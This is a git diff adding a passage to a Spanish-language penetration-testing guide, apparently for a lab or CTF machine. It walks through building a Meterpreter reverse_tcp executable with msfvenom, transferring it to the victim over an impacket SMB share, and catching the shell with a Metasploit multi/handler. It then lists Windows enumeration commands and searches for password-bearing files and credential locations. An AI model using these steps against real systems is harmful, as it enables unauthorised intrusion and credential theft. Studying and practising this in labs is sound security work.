@@ -63,3 +63,108 @@ Para ello, convertiremos la sesión obtenida con Netcat en una sesión de Meterp
 msfvenom -p windows/meterpreter/reverse_tcp LHOST=<nuestra_ip> LPORT=<puerto_escucha> -f exe > shell.exe # Creamos un archivo .exe malicioso para obtener una sesión meterpreter.
 ```
 
+¿Cómo llevo este archivo a la máquina víctima?
+
+Pues para realizar este proceso debemos hacer exactamente el mismo procedimiento de antes, levantarnos un servidor con un recurso compartido.
+
+```bash
+impacket-smbserver <nombre_recurso> $(pwd) -smb2support # Con $(pwd) le indicamos que levante el servidor en el directório actual.
+```
+
+
+Ahora para poder realizar la descarga del recurso compartido lo que debemos hacer es irnos a un directorio dentro de la máquina víctima que nos permita esa descarga de archivos, que en este caso será el directorio /temp
+
+```bash
+copy \\<ip_nuestra_máquina>\\<nombre_recurso>\\shell.exe shell.exe # Accedemos a la carpeta Temp y nos traemos la shell.exe.
+```
+
+Antes de ejecutar el archivo .exe nos tenemos que poner a la escucha con metasploit:
+
+```bash
+    msfconsole -q # Iniciar metasploit en modo silencioso.
+    use multi/handler
+    set payload windows/meterpreter/reverse_tcp
+    set LHOST <ip_nuestra_máquina>
+    set LPORT <puerto_escogido>
+    run
+```
+
+Una vez que el payload se haya cargado, debemos acceder a la máquina víctima y ejecutar shell.exe para activar el archivo malicioso y establecer la sesión de Meterpreter.
+
+Ahora que la sesión de Meterpreter está activa, el siguiente paso es determinar las acciones a realizar. Podemos explorar el sistema comprometido, escalar privilegios, mantener el acceso o extraer información relevante, según los objetivos del procedimiento.
+
+Ahora os mostraré una serie de comandos que os serán útiles cuando hayamos ganado esa intrusión como el usuario con máximos privilegios.
+
+
+## 📝 Comandos de interés
+
+```bash
+meterpreter > getuid # Verificamos si hemos conseguido privilegios máximos
+sessions -l # Ver sesiones activas en metasploit.
+sessions -v # Mostrar información detallada de las sesiones.
+sessions -L # Listar sesiones y sus rutas.
+sessions -k <número_sesión> # Eliminar una sesión específica.
+sessions -K # Para eliminar todas las sesiones activas. 
+```
+
+## 🔍 Enumeración del Sistema
+
+```bash
+systeminfo # Información básica del sistema
+hostname # Información básica del sistema
+ver # Versión del sistema operativo
+winver # Versión del sistema operativo
+```
+
+## 🔍Información de Usuario y Privilegios
+
+```bash
+whoami /all # Usuario actual y privilegios
+net user # Usuario actual y privilegios
+net localgroup administrators # Usuario actual y privilegios
+whoami /priv # Usuario actual y privilegios
+qwinsta # Listado de usuarios conectados
+query user # Listado de usuarios conectados
+```
+
+## 🔍Enumeración de Red
+
+```bash
+ipconfig /all # Configuración de red
+route print # Configuración de red
+netstat -ano # Configuración de red
+arp -a # Configuración de red
+net share # Recursos compartidos
+net use # Recursos compartidos
+```
+
+## 🔍 Búsqueda de Archivos Sensibles
+
+```bash
+C:\Users[username]\AppData\
+
+C:\Windows\System32\config\
+
+C:\Program Files\
+
+C:\Windows\Panther\
+
+C:\Windows\repair\
+```
+
+```bash
+# Búsqueda de archivos sensibles
+dir /s /b "C:\\*.txt" "C:\\*.pdf" "C:\\*.doc" "C:\\*.docx"
+findstr /si password *.txt *.xml *.ini
+dir /s /b /a "C:\\Users\\*pass*.txt" "C:\\Users\\*pass*.xml" "C:\\Users\\*pass*.ini"
+```
+
+--- 
+
+<div style="text-align:center; font-size: 0.9em; margint-top: 40px; color: #33ff33;">
+    💻 Hecho con 💚 por <strong>Marcela</strong> - 2025
+</div>
+
+
+
+
